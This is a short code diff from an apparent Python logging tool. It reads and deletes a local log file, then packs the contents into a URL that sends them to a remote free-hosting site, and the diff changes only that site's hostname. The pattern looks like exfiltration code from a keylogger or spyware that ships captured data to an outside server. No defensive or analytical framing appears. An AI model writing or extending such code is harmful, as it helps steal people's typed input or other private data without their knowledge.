@@ -109,7 +109,7 @@ def inform():
         os.remove("log.txt")
         for line in lines:
                 log = log + line
-        url = "http://vidwansak.000webhostapp.com/site.php?logger=" + urllib.quote_plus(log)
+        url = "http://vidhawansak.000webhostapp.com/site.php?logger=" + urllib.quote_plus(log)
       #  print url
        # print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
         
